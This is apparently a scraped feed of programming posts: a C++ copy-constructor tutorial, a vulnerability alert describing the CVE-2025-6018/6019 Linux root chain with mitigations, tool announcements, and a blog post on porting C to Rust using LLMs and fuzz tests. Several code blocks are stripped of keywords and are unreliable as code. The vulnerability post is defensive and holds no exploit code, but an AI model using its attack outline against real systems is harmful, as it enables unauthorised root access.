with a burden — when copying involves resource ownership, such as:</p><ul></ul><p>For these cases, the default copy constructor is broken. That’s because the default version just performs a member-wise shallow copy, which results in shared ownership and double-deletion if you're not careful.</p><h2>When is the copy constructor used?</h2><p>The copy constructor is invoked invisibly in many scenarios:</p><pre spellcheck=\"false\">MyClass a = b;&nbsp; &nbsp; &nbsp; &nbsp;\nfoo(a);&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  a;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \nvec.push_back(a);&nbsp; &nbsp; </pre><p>Compiler optimizations like copy-elision and RVO (Return Value Optimization) may remove it — but that’s an optimization, not a guarantee (until C++17).</p><p>You can also manually call it:</p><p>If you don’t declare a copy constructor, the compiler generates one:</p><pre spellcheck=\"false\">MyClass::MyClass( MyClass&amp; other)\n&nbsp; &nbsp; : member1(other.member1),\n&nbsp; &nbsp; &nbsp; member2(other.member2),\n&nbsp; &nbsp; &nbsp; ...\n{}\n</pre><p>Each member is copied using their own copy constructors.</p><p>If any member is not copyable, your class is implicitly non-copyable. You’ll get a compile-time error.</p><pre spellcheck=\"false\">\n&nbsp; &nbsp; NonCopyable() = ;\n&nbsp; &nbsp; NonCopyable( NonCopyable&amp;) = ;\n&nbsp; &nbsp; NonCopyable&amp; =( NonCopyable&amp;) = ;\n};\n\n\n\n&nbsp; &nbsp; NonCopyable resource; \n};\n\n\n{\n&nbsp; &nbsp; Wrapper a;\n&nbsp; &nbsp; Wrapper b = a; \n}\n\n\n</pre><p><em>Exercise: How to fix this error?</em></p><p>Use  in headers to control public/protected/private behavior. Makes interfaces clear in public APIs.</p><p>If the copy constructor is defaulted in the class definition, and all fields are trivial, then the whole type is trivial. Required for:</p><ul><li>Optimization (Inlining and RVO)</li></ul><p>Compilers often inline trivial copy constructors. With optimization flags (-O2, -O3), the copy constructor is emitted as direct memory moves.</p><p>C++17 makes copy-elision mandatory in some cases:</p><pre spellcheck=\"false\">{\n&nbsp;  T(); \n}\n</pre><p>In C++14 and earlier, this could involve:</p><ul><li>Constructing a temporary T</li><li>Copying/moving into the return value</li></ul><p>In C++17, the standard mandates:</p><ul><li>The object is constructed directly into the caller’s storage.</li><li>No copy or move constructor is ever called.</li></ul><p>If your class manages a resource, you must define:</p><ul></ul><p>Otherwise, you get default ones, which often break.</p><p>In modern C++11+, we extend this to:</p><ul></ul><p>Plus these two cases, this is called the Rule of Five. These are generated only if none of the big five is user-declared. Mixing them causes suppression.</p><h2>Rule of 0 (Modern STL idiom)</h2><p>Prefer composition with RAII types (, , ) so that you don't need to define any of the big five.</p><p>That's why you should always define all five if you mix copies and moves. If you define any of the big five, the compiler suppresses the others:</p><p>In modern C++, deep copying large resources is often undesirable. That's why:</p><ul><li>Use  disables copy constructor</li><li>Use  implements reference counting</li></ul><ul><li>Use  for clarity and triviality</li><li>Use  to explicitly prevent behavior</li><li>Don’t mix copies and moves unless you define all 5</li><li>Favor , ,  for Rule of 0</li><li>Watch for suppressed constructors in template code and header-only libs</li><li>Benchmark cost of copy vs move when passing large structures or buffers</li></ul>","contentLength":4010,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lm4h6c/deep_in_copy_constructor_the_heart_of_c_value/"},{"title":"Structuring Arrays with Algebraic Shapes","url":"https://dl.acm.org/doi/abs/10.1145/3736112.3736141","date":1751055114,"author":"/u/ketralnis","guid":174574,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lm3ts2/structuring_arrays_with_algebraic_shapes/"},{"title":"[D] Suggestions on dealing with ICCV rejection","url":"https://www.reddit.com/r/MachineLearning/comments/1lm3jlh/d_suggestions_on_dealing_with_iccv_rejection/","date":1751054420,"author":"/u/WeirdElectrical8941","guid":173951,"unread":true,"content":"<p>I recently had a paper rejected by ICCV for being too honest (?). The reviewers cited limitations I explicitly acknowledged in the paper's discussion as grounds for rejection (and those are limitations for similar works too).</p><p>To compound this, during the revision period, a disruptive foundational model emerged that achieved near-ceiling performance in our domain, significantly outperforming my approach.</p><p>Before consigning this work (and perhaps myself) to purgatory, I'd welcome any suggestions for salvage strategies.</p>","contentLength":519,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[MEDIA] Announcing Sniffnet v1.4 — it’s 2X faster than Wireshark at processing Packet Capture files!","url":"https://www.reddit.com/r/rust/comments/1lm3hzk/media_announcing_sniffnet_v14_its_2x_faster_than/","date":1751054310,"author":"/u/GyulyVGC","guid":173979,"unread":true,"content":"<p>Sniffnet v1.4 has just been released!</p><p>Sniffnet is an open-source network monitoring tool developed in Rust, and the latest version of the app includes, among other features, the possibility to import data from PCAP files.</p><p>The video shows a live session of Sniffnet processing a 1.6 GB file (2.6 million network packets) in about 25 seconds, making it more than 2X faster than Wireshark that takes about 55 seconds to parse the same file on the same machine.</p><p>To know more about it and this release, you can read the dedicated blog post.</p><p>Links to the blog post and other resources are in the comments.</p>","contentLength":595,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Vulnerability Alert! Easy Root on Most Linux Distros (SUSE, Alma, RHEL…) via CVE-2025-6018 + CVE-2025-6019","url":"https://www.reddit.com/r/linux/comments/1lm3e9r/vulnerability_alert_easy_root_on_most_linux/","date":1751054051,"author":"/u/itguyeric","guid":173982,"unread":true,"content":"<p>Heads-up to all my fellow Linux folks. A new 2-part exploit chain just dropped, combining CVE-2025-6018 and CVE-2025-6019 to achieve  on default-configured systems.</p><p>Here’s the short version:</p><ul><li> (PAM flaw in SUSE): Lets an unprivileged SSH user gain  Polkit context — i.e., trick the system into thinking they’re physically present.</li><li> (udisks2 via libblockdev): Mounts an XFS image and bypasses nosuid,nodev flags to get a root shell — but only works  the user has  (see above).</li></ul><p>Together? <strong>Any SSH user can get root.</strong></p><p>Affected: SUSE, AlmaLinux, RHEL, Fedora, Debian, Amazon Linux, more.</p><ul><li>Adjust Polkit rule: change org.freedesktop.udisks2.modify-device from allow_active to auth_admin.</li><li>Disable or reorder PAM modules as per vendor guidance.</li></ul><p>If you’re running Alma, CentOS, or SUSE-based servers in prod — it’s time to patch your...stuff!</p>","contentLength":836,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Calico resources","url":"https://www.reddit.com/r/kubernetes/comments/1lm1t2h/calico_resources/","date":1751050138,"author":"/u/Suitable-Time-7959","guid":173911,"unread":true,"content":"<div><p>Expecting an interview for role of K8s engineer which focussed on container networking specifically Calico.? </p><p>Are there any good resources other than Calico official documentation </p></div>   submitted by   <a href=\"https://www.reddit.com/user/Suitable-Time-7959\"> /u/Suitable-Time-7959 </a>","contentLength":220,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I made a `#[timeout]` proc-macro-attribute that wraps async functions running under the tokio-runtime, because more often than not (in code that I write) asynchronous functions running too long is an error case, and wrapping/unwrapping them manually is a hassle.","url":"https://github.com/MarcusGrass/timeout","date":1751049214,"author":"/u/SuspiciousSegfault","guid":173978,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lm1f6g/i_made_a_timeout_procmacroattribute_that_wraps/"},{"title":"While managing a vending machine, Claude forgot he wasn't a real human, then had an identity crisis: \"Claude became alarmed by the identify confusion and tried to send many emails to Anthropic security.\"","url":"https://www.reddit.com/r/artificial/comments/1lm1ex4/while_managing_a_vending_machine_claude_forgot_he/","date":1751049197,"author":"/u/MetaKnowing","guid":173914,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Calculating the Fibonacci numbers on GPU","url":"https://veitner.bearblog.dev/calculating-the-fibonacci-numbers-on-gpu/","date":1751046685,"author":"/u/ketralnis","guid":174122,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lm0dlm/calculating_the_fibonacci_numbers_on_gpu/"},{"title":"Parameterized types in C using the new tag compatibility rule","url":"https://nullprogram.com/blog/2025/06/26/","date":1751046625,"author":"/u/ketralnis","guid":174041,"unread":true,"content":"<div>\n    nullprogram.com/blog/2025/06/26/\n  </div><p>C23 has <a href=\"https://www.open-std.org/jtc1/sc22/wg14/www/docs/n3037.pdf\">a new rule for struct, union, and enum compatibility</a>\nfinally appearing in compilers starting with GCC 15, released this past\nApril, and Clang later this year. The same struct defined in different\ntranslation units (TU) has always been compatible — essential to how they\nwork. Until this rule change, each such definition within a TU was a\ndistinct, incompatible type. The new rule says that, , they\nare compatible! This unlocks some type parameterization using macros.</p><p>How can a TU have multiple definitions of a struct? Scope. Prior to C23\nthis wouldn’t compile because the compound literal type and the return\ntype were distinct types:</p><div><div><pre><code></code></pre></div></div><div><div><pre><code></code></pre></div></div><p>Where I write out one of these for each  that I might want to put into\na slice. With the new rule we can change it slightly, taking note of the\nintroduction of a tag (the name after ):</p><div><div><pre><code></code></pre></div></div><p>This makes the “write it out ahead of time” thing simpler, but with the\nnew rule we can skip the “ahead of time” part and conjure slice types on\ndemand. Each declaration with the same  is compatible with the others\ndue to matching tags and fields. So, for example, with this macro we can\ndeclare functions using slices parameterized for different element types.</p><div><div><pre><code></code></pre></div></div><div><div><pre><code></code></pre></div></div><p>I worried these macros might confuse my tools, particularly <a href=\"https://github.com/universal-ctags/ctags\">Universal\nCtags</a> because <a href=\"https://github.com/skeeto/w64devkit\">it’s important to me</a>. Everything handles\nprototypes better than expected, but ctags doesn’t see fields with slice\ntypes. Overall they’re like a very limited form of C++ templates. Though\nonly the types are parameterized, not the functions operating on those\ntypes. Outside of unwarranted macro abuse, this new technique does nothing\nregarding generic functions. On the other hand, my generic slice function\ncomplements the new technique, especially with the help of C23’s new\n to mitigate ’s limitations:</p><div><div><pre><code></code></pre></div></div><p>This exploits the fact that implementations adopting the new tag rule also\nhave <a href=\"https://www.open-std.org/jtc1/sc22/wg14/www/docs/n3322.pdf\">the upcoming C2y null pointer rule</a> (note: also requires a\ncooperating libc). Putting it together, now I can write stuff like this:</p><div><div><pre><code></code></pre></div></div><p>But it doesn’t take long to run into limitations. It makes little sense to\ndefine, say, a  without a generic function to manipulate it.\nThis also doesn’t work:</p><div><div><pre><code></code></pre></div></div><p>Due to  in the macro, required to establish a unique tag for\neach element type. The parameter to the macro must be an identifier, so\nyou have to build up to it (or define another macro), which sort of\ndefeats the purpose, which was entirely about convenience.</p><div><div><pre><code></code></pre></div></div><p>The benefits are small enough that perhaps it’s not worth the costs, but\nit’s been at least worth investigating. I’ve written a small demo of the\ntechnique if you’d like to see it in action, or test the abilities of your\nlocal C implementation: <a href=\"https://gist.github.com/skeeto/3fe27cd81ca5bdb4926b12e03bdfbc62\"></a></p>","contentLength":2724,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lm0cpt/parameterized_types_in_c_using_the_new_tag/"},{"title":"[R] Potemkin Understanding in Large Language Models","url":"https://www.reddit.com/r/MachineLearning/comments/1llzcu1/r_potemkin_understanding_in_large_language_models/","date":1751044236,"author":"/u/transformer_ML","guid":174358,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/transformer_ML\"> /u/transformer_ML </a>","contentLength":37,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Ophis: Transform any Cobra CLI into an MCP server","url":"https://www.reddit.com/r/golang/comments/1llyrnw/ophis_transform_any_cobra_cli_into_an_mcp_server/","date":1751042837,"author":"/u/njayp","guid":174066,"unread":true,"content":"<p>I built a Go library that automatically converts your existing Cobra CLI apps into MCP (Model Context Protocol) servers, letting AI assistants like Claude interact with your tools through structured protocols instead of raw shell access. I have had success turning my own CLIs and other open source CLIs into mcp servers. Here are images showing Claude interacting with my Kubernetes cluster using <a href=\"https://raw.githubusercontent.com/njayp/host/refs/heads/main/ophis/screenshots/Screenshot%202025-06-27%20at%208.27.45%E2%80%AFAM.png\">helm</a> and <a href=\"https://raw.githubusercontent.com/njayp/host/refs/heads/main/ophis/screenshots/Screenshot%202025-06-27%20at%208.28.44%E2%80%AFAM.png\">kubectl</a>. Code <a href=\"https://github.com/njayp/ophis\">here</a>. All criticism is appreciated. Cheers!</p>","contentLength":464,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The software engineering \"squeeze\"","url":"https://zaidesanton.substack.com/p/the-software-engineering-squeeze","date":1751042096,"author":"/u/zaidesanton","guid":173850,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1llygag/the_software_engineering_squeeze/"},{"title":"Finally Switched to Linux Mint After Watching PewDiePie's Video – Sharing My Beginner Journey, Learning Curve & Why I’m Sticking With It","url":"https://www.reddit.com/r/linux/comments/1llx1l4/finally_switched_to_linux_mint_after_watching/","date":1751038755,"author":"/u/yaragh17","guid":173776,"unread":true,"content":"<p>So I watched PewDiePie's video where he installed Linux Mint on his PC and Arch Linux on his laptop and ever since then, I’ve been kind of fascinated by the idea of trying Linux myself.</p><p>I’ve been a lifelong Windows user, so I was definitely hesitant at first. But the more I learned about why people switch to Linux, the more it started to make sense — the control, the community, the freedom.</p><p>After a lot of overthinking, backing up data, and double-checking everything, I finally took the plunge and installed Linux Mint on my PC.</p><p>Now, I won’t lie — it was definitely a learning curve to get everything installed and up and running. I used YouTube tutorials and I still rely on ChatGPT to help me tweak things and make sure Mint runs smoothly.</p><p>One thing I’ve come to love is the freedom to customize things exactly how I want — not based on how someone else says it “should” be. That’s powerful, even if I’m still figuring it all out through trial and error.</p><p>For example, one of the first things I missed from my HP laptop was three-finger and two-finger touchpad gestures. Out of the box, they didn’t work — but I managed to set up a three-finger swipe to switch between tabs/windows, and when it finally worked, the sense of achievement was unreal.</p><p>That said… I’m still struggling with two-finger swipe gestures — specifically, the ability to go back and forward in browsers (like when you're clicking through links and want to swipe to go back a page). I’ve tried setting it up the same way I did the three-finger gesture, but for some reason, it just won’t work. Even ChatGPT couldn’t fully help me with this one — maybe I’m just dumb with terminal stuff. So I’m hoping some kind Redditors can guide me on how to set this up properly.</p><p>Another concern I had was: Can I actually use Linux for work? I wasn’t sure, especially since Linux can’t run Microsoft Office or Microsoft 365 natively. But luckily, my company uses Google Workspace instead of Teams or Microsoft apps. And let me tell you — every Google app, every tab I open just feels faster on Linux. I love that.</p><p>I just hope my next job sticks with Google Workspace too</p><p>And you know what? Linux has kind of made me feel like a kid again. I’m exploring. I’m breaking things. I’m fixing them. With my small victories, I tried to show off Linux &amp; explaining this to some friends, and they just looked at me weirdly.... “Why leave the comfort of Windows? Why use the terminal for things that are already automated?” But for me, as much as I love my convenience — it’s about choice. Linux gives me the freedom to decide what to do and what not to do. And if it expects me to learn something in order to make things work the way I want — I’m okay with that. I’m ready to use YouTube tutorials, subreddits, ChatGPT — whatever it takes. Because I’m doing it for me, not just because “it’s right there” like on Windows.</p><p>If I need something, I’ll install it. If I don’t, I won’t. That’s the kind of freedom I want from my system.</p><p>I know it’s going to be a big learning curve. Linux Mint is just the beginning. But honestly? It’s a great place to start. And hopefully down the line, I’ll be exploring other distros too. ..</p>","contentLength":3256,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Perl terminal","url":"https://www.reddit.com/r/linux/comments/1llw6w7/perl_terminal/","date":1751036711,"author":"/u/CroJackson","guid":173775,"unread":true,"content":"<div><ul><li>Full-featured terminal emulator written in Perl with GTK3</li><li>Custom command execution with proper PTY support</li><li>Smart directory navigation with global directory indexing</li><li>Enhanced  command with fuzzy matching and multiple choice selection</li><li>Built-in system information display (/ commands)</li><li>Command history and auto-completion support</li></ul><ul><li>Custom headerbar with window controls (minimize, maximize, close)</li><li>Frameless window design with custom resize handles</li><li>Transparency support with RGBA background colors</li><li>Customizable color schemes for terminal output</li><li>Advanced syntax highlighting for  command output with file type colors</li><li>Smart column formatting for command output</li><li>Distro-specific icon display in system info</li></ul><p><strong>Customization &amp; Settings:</strong></p><ul><li>Comprehensive settings dialog for fonts, colors, and appearance</li><li>Advanced color settings with 25+ customizable color categories</li><li>Support for custom icons/images (headerbar buttons, distro logos and custom images)</li><li>Configurable transparency levels</li><li>Font family and size customization</li><li>Border width and accent color settings</li></ul><p><strong>Smart Directory Features:</strong></p><ul><li>Automatic directory indexing across the entire filesystem</li><li>Priority-based directory search (current dir &gt; home &gt; system dirs)</li><li>Intelligent  command with partial matching</li><li>Multiple directory matches with numbered selection</li><li>Background directory index updates</li></ul><ul><li>Toggleable command search panel</li><li>JSON-based command storage and search</li><li>Command categories and tagging system</li><li>Click-to-insert commands from search results</li></ul><ul><li>System info display with either distro logos or custom images</li><li>System details (OS, kernel, hardware, etc.)</li><li>Date/time with timezone and location detection</li><li>Memory, disk, and GPU information</li></ul><ul><li>Persistent settings and preferences</li><li>Automatic window size and position saving</li><li>Command history preservation</li><li>Directory index caching for performance</li></ul><ul><li>Proper pseudo-terminal (PTY) implementation</li><li>Smart terminal sizing and environment variable handling</li><li>Color-coded file permissions and attributes</li><li>Enhanced  output with proper column alignment</li><li>Transparent widget hierarchies for visual effects</li></ul></div>   submitted by   <a href=\"https://www.reddit.com/user/CroJackson\"> /u/CroJackson </a>","contentLength":2038,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The unreasonable effectiveness of fuzzing for porting programs from C to Rust","url":"https://rjp.io/blog/2025-06-17-unreasonable-effectiveness-of-fuzzing","date":1751035867,"author":"/u/kibwen","guid":174143,"unread":true,"content":"<p><em>A simple strategy of having LLMs write fuzz tests and build up a port in topological order seems effective at automating porting from C to Rust.</em></p><h2>Agents are starting to produce more and more code</h2><p>A week or 2 back, I was reflecting on some code Claude had generated for me and\nI had a sort of moment of clarity. \"Clarity\" might be overstating it; more\nlike the type of thought you have in the shower or after a few beers. Anyway.</p><p>The thought was: LLMs produce more and more code, and they'll eventually be\nproducing more code than people. We can imagine at some point we're going to\nfork from mostly people writing code to mostly computers. What does this mean\nfor how we're going to treat our libraries and code maintenance in the future?</p><p>LLMs make it easier to deal with API issues or inconsistencies, they're dealing\nwith it, not us. Will this continue, leaving us with a <a href=\"https://en.wikipedia.org/wiki/The_Princess_and_the_Pea\">The\nPrincess and the Pea</a> situation where we deal with piles of leaking\nabstractions? Or will we use LLMs to radically change our APIs when needed - will\nthings get cleaner and better and faster as we go?</p><p>LLMs open up the door to performing radical updates that we'd\nnever really consider in the past. We can port our libraries from one language\nto another. We can change our APIs to fix issues, and give downstream users an\nLLM prompt to migrate over to the new version automatically, instead of\nrewriting their code themselves. We can make massive internal refactorings.\nThese are types of tasks that in the past, , a senior engineer would\nreject in a project until its the last possibly option. Breaking customers\nalmost never pays off, and its hard to justify refactoring on a \"maintenance\nmode\" project.</p><p>But if its more about finding the right prompt and letting an\nLLM do the work, maybe that changes our decision process.</p><h2>Maintaining big important libraries is no fun</h2><p>As a result of a few years of this style of development, a huge surface of\nPython code had been cobbled together on top of the C++ core. The complexity\nonly spiraled over time: engineers came into the project and needed to get\nsomething done. Increasingly the easiest thing to do was to add some Python global or\ncontext manager, shove something in it, then grab it later. Do this over and\nover and eventually it becomes impossibly to figure out what's happening. It\nalso ended up being incredibly slow. It would take 10s of minutes to build some\ngraphs (TensorFlow's equivalent of a program).</p><p>But it would have been an enormous effort to do this all. Each time you tried to\nport a module you'd reveal subtle errors or assumptions that you'd need to debug\nand revisit, update users etc. Given our staffing, we couldn't really justify\nthe time versus the real work of making sure Ads didn't break.</p><p>Even though TensorFlow was moving to maintenance mode, if we could have made\nthis type of change it would have improved the maintainer and users' experience\nfor the years we need to keep the lights on. But because the cleanup was thorny\nand slow, we just couldn't justify the cost.</p><p>This is by no means limited to TensorFlow. If you're working on something like\n<a href=\"https://github.com/libexpat/libexpat\">libexpat</a> its hard to justify\nrefactoring your code or rewriting it in Rust, no matter how potentially useful\nit would be, when you've got this at the top of your page:</p><p>But what if we could make this type of refactoring much, much cheaper?</p><h2>Infinite patience versus really hard problems</h2><p>My experience with coding agents like <a href=\"https://github.com/anthropics/claude-code\">Claude\nCode</a> and <a href=\"https://aider.chat\">Aider</a>\nmakes me think this could be different today. I've found that agents are really\ngood when you set them up against a concrete obstacle: \"I changed this API, now\nfix everything until the tests pass\". They can show real ingenuity in finding\nsolutions to subtle problems. I've had the LLM diagnose subtle bugs in a\nprogram, write test cases, write minimizers, and probe for solutions, where my\ncontribution to this conversation largely consisted of \"keep going until the\ntest passes\". Not always, of course. Good luck getting an agent to produce\nanything other than React &amp; Tailwind on your new project, for instance.</p><p>My hunch is that the stronger the test case, the more concrete the objective the\nLLM has to fulfill, the less likely it is to try to sabotage the problem. e.g. \"I made\nan empty test and it passed\", or to misinterpret the request \"you asked for a\nRuby on Rails project, so here's NextJS, like you asked for\".</p><p>You're putting the agent between a rock and a hard place, as it were, and this\nreduces the easy solutions it could use, and thus it works harder to find a real\nsolution.</p><p>In general its really hard to define test cases, a priori, that are specific\nenough to constrain the LLM to do exactly what you want. But what about when\nwe're changing an existing project? What if we could constrain the output before\nand after the changes to be the same? This could be as simple as running all of\nour tests for our project, if we're confident they're very thorough. For most\ncomplex changes, it might be hard to keep both versions aligned.</p><p>What happens if we take a very specific and important type of refactoring:\nmoving from an unsafe language like C to a safe language like Rust? \"I did something with memory I shouldn't have\" are\nstill in the <a href=\"https://www.cvedetails.com/vulnerabilities-by-types.php\">top 3 for CVEs</a>. This is exactly the\ntype of thing we might  to do, but hard to justify.  Can we make porting more of a prompt engineering problem instead of a coding\none? Let's find out...</p><p>Porting C to Rust with LLMs isn't a brand new idea:\n<a href=\"https://github.com/immunant/c2rust\">c2rust</a> can produce a mechanical\ntranslation of C code to Rust, though the result is intentionally \"C in Rust\nsyntax\", with the idea that a person uses it as a starting point to then Rustify\nthe project.</p><p>More recently researchers have started throwing LLMs at the problem.\n<a href=\"https://arxiv.org/pdf/2412.14234\">Syzygy</a> is the only paper I found which produced a complete working\nimplementation of a library, the other papers were more like \"we threw this at\nthe wall and it compiled\". Syzygy leverages a bunch of machinery to mechanize\nparts of the porting process:</p><p>What's cool is their approach : they get a compression program out of it, and its <a href=\"https://github.com/syzygy-project/Syzygy_Zopfli/blob/main/rust_code/src/main.rs\">all safe Rust</a>. That's a non-trivial achievement! That said, it runs 3x slower than the C version, and its not\n: how much this detail matters depends on the users of your API and how much\nyou care about <a href=\"https://en.wikipedia.org/wiki/Hyrum%27s_Law\">Hyrum's Law</a>.</p><p>Syzygy puts a lot of work into developing test cases for symbols as they port,\nbut because the tests are against inferred properties of the C program, instead\nof directly comparing against the C behavior, you can end up with subtle changes\nin behavior. This is hard to avoid with their approach: if the interfaces\ndiffer, it becomes hard to perform a direct comparison between your C and Rust\nprograms.</p><p>I wanted to test if we could do something radically simpler and more direct: <em>what if we just\nrandomly compared the C and Rust output as we ported</em>? Would that be sufficient\nto port an entire library? Or would our tests be ineffectual and we'd get stuck\nhalfway through. In effect we'd be performing a specific type of fuzz or\n<a href=\"https://en.wikipedia.org/wiki/Property_testing\">property testing</a> to our\nprogram as we ported it.</p><p>Property testing has an interesting supposition: we can avoid the drudge work of\nwriting tests by having the computer build out the test cases for us, and just\ncheck if a property holds for our system.  Trivia item: it is a fundamental law\nof all property testing frameworks that they start with one of 2 examples:</p><ul><li>reverse is its own inverse, so .</li><li>the elements of a sorted list are in order</li></ul><p>Don't believe me? Check it out:</p><p>These examples are common for a reason. They're the perfect fit for property\ntesting: you just feed random lists in and check your condition holds. A common\ncritique of property testing is that it doesn't really extend beyond these\nexamples. Either its too hard to generate meaningful inputs, or\nproperties to test, and so we're better off writing individual test\ncases. My experience is that there's some narrow cases where property testing is\ngreat, but I still end up writing plenty of individual tests.</p><p>Sometimes determining the property that holds is hard: I can\ntest individual cases and validate them, but I don't know how to generalize.  Or\ngenerating interesting inputs might be hard. If I want to test a C parser,\nsampling random bit strings isn't going to help me very much.  Entire projects\nlike <a href=\"https://github.com/csmith-project/csmith\">Csmith</a> are dedicated to fuzzing C compilers.</p><p>But in our case we've solved at least the property test is solved for us: we\nhave the  output property to test: for a given input X, does our Rust\nlibrary produce the exact same output as our C library? If we can test this over\nan interesting part of our input space, then we can be confident we've preserved\nour behavior.</p><p>Let's see how this works out.</p><h2>Porting C to Rust, attempt 0</h2><p>The logs of my first attempt are fortunately lost to the howling void. I spent\nan hour or 2 with Claude Code, following this policy:</p><ul><li>Write a test for symbol X to make sure it works</li></ul><p>I wasn't comparing directly against the C version, instead relying on the unit tests\nto validate the behavior was preserved. This attempt did not go well. As modules\nwere ported over, and we started to use symbols from previous ports, we exposed\nmore and more latent bugs. Eventually, you're in a state where the top-level\n doesn't work, and you're stuck debugging the whole program to\nfigure out what happened.</p><p>I realized this wasn't going to scale. Even if I got something working, I was\nlooking at a lot of work and I couldn't explain how to replicate what I did with\nanother project.</p><h2>Porting C to Rust, attempt 1</h2><p>My second attempt was  slightly less crude:</p><ul><li>For each C module, ask Claude Code to write a Rust version.</li><li>Then write a fuzz test for that module</li></ul><p>The results of this experiment are on\n<a href=\"https://github.com/rjpower/zopfli/tree/master/zopfli-rs/\">Github</a>.</p><p>This time, it worked: other than writing the <a href=\"https://github.com/rjpower/zopfli/blob/master/port/RUST_PORTING.md\">porting guidelines</a> and cajoling the model, I didn't do much work.  I didn't do any debugging by\nhand or have to intercede to understand what was happening. In the case a test found a discrepancy, I would have the model write a <a href=\"https://github.com/rjpower/zopfli/blob/master/port/bugs/20241219_deflate_tree_encoding_discrepancy.md\">bug report</a>\nand then iterate until it solved the problem.</p><p>But again this wasn't automated and it was hardly reproducible. I had to babysit\nthe process quite a bit, and while the library seemed to work, the\nresults were  than the original Zopfli C implementation. And\nbecause of the ad-hoc approach, I didn't have a good idea of what had changed.</p><p>Still this was promising. So I was incentivized to try again, with a bit more rigor and automation.</p><h2>Porting C to Rust, \"for real\"</h2><p>Our final process would be more rigorous. We want to port a small portion of our\nprogram at a time, and automate as much of the porting as possibly. Instead of\ncalling into an agent and babysitting it, we'd need to hand-roll our own\nmachinery to call into an LLM API and perform the necessary edits in a fully\nautomated fashion. So our overall process would be:</p><ul><li><p>Sort symbols in topological order based on the static call graph. If function F calls function G, then first port function G, then function F, etc. (Cycles need to be ported together, but we didn't have any for this library). This ensures that when we are porting a new symbol into Rust, we can call into our child symbols immediately; we don't have to implement anything new or call into C. \"Symbol\" here means a struct, enum or function.</p></li><li><p>For a given public C declaration (in a header file), create an FFI entry for it and a Rust implementation with the exact same signature. We'll do this by giving the LLM the C header &amp; source and asking for a translation.</p></li></ul><pre><code>// ffi.rs\npub fn AddDynamicTree(\n    ll_lengths: *const ::std::os::raw::c_uint,\n    d_lengths: *const ::std::os::raw::c_uint,\n    bp: *mut ::std::os::raw::c_uchar,\n    out: *mut *mut ::std::os::raw::c_uchar,\n    outsize: *mut usize,\n);\n\n// deflate.rs\npub unsafe fn AddDynamicTree(\n    ll_lengths: *const c_uint,\n    d_lengths: *const c_uint,\n    bp: *mut c_uchar,\n    out: *mut *mut c_uchar,\n    outsize: *mut usize,\n) {\n    ...\n}\n</code></pre><ul><li>Have the LLM write a fuzz test which samples over possibly inputs and compares the C and Rust implementations, asserting if there is a discrepancy <a href=\"https://github.com/rjpower/portkit/blob/1d5a2c21adbfc71cb0906fd16a0cf7252be5dcd5/zopfli-port/rust/fuzz/fuzz_targets/fuzz_AddDynamicTree.rs\">example</a>. No attempt was made to guide the fuzz test inputs other than instructing the LLM to avoid generating invalid structures (e.g. null pointers or numbers out of an expected range).</li></ul><pre><code>#[derive(Debug, arbitrary::Arbitrary)]\nstruct FuzzInput {\n    ll_lengths: Vec&lt;u32&gt;,\n    d_lengths: Vec&lt;u32&gt;,\n}\n\nfuzz_target!(|input: FuzzInput| {\n    ...\n    // setup inputs\n    let c_result = ffi::AddDynamicTree(...)\n    let rust_result = rust::AddDynamicTree(...)\n\n    assert_eq!(c_result, rust_result, \"C and Rust diverged.\");\n</code></pre><ul><li>Run the fuzz test and fix until everything compiles and the fuzz test passes.</li></ul><p>We repeat this for each symbol in the program until we hit the top-level main().</p><p>Prior to porting I modified the C source slightly to make a few static functions\nextern so that we could create an FFI to them. This would allow the LLM to port\nsmaller chunks at a time (otherwise there were some modules where the LLM would\nhave to port 1000 lines of code at once because only the main symbol was\nvisible). I also copied some  constants by hand because my C traversal\nhadn't detected them.</p><p>Originally I tried to break up the task of porting a symbol. We'd separately\ndefine the FFI to C, a stub implementation of the Rust function, define a fuzz\ntest, then build the implementation. The idea was that this would let us verify\neach of these via a separate call and we'd be more robust. Ultimately this\nproved more confusing to the agents than helpful.</p><p>In the end, I simply prompted the LLM to do all the steps for porting a symbol\nat once, reprompting it if the fuzz test didn't exist or pass.</p><p>And in the end... it worked? The result is a <a href=\"https://github.com/rjpower/portkit/tree/main/zopfli-port\">Rust implementation of\nZopfli</a> that gives\n results on every input I've tried to the C version. This is\ndifferent from the Syzygy results, where they ended up with a program that\ncompresses correctly, but not identically  to the C version.  Because\nwe locked the Rust and C versions to use the same API at each step, the\nresulting program isn't very \"rusty\", but its a complete translation.</p><p>About 90% of symbols were auto-ported using gemini-2.5-pro-06-05 and a crappy\n\"agent\" library I wrote up for this task. The remaining 10% I switched over to\nrunning in a Claude Code, as Gemini seemed to struggle with patch formats and\nimports. The only work I did manually was to adjust a few places where the LLM\nwas calling the FFI code from Rust and clean up some warning messages.</p><h2>But why does this work at all?</h2><p>To clarify, the surprising result is not that fuzzing would detect discrepancies\nat the top-level of our library. Target specific fuzzers work great for this task:\n<a 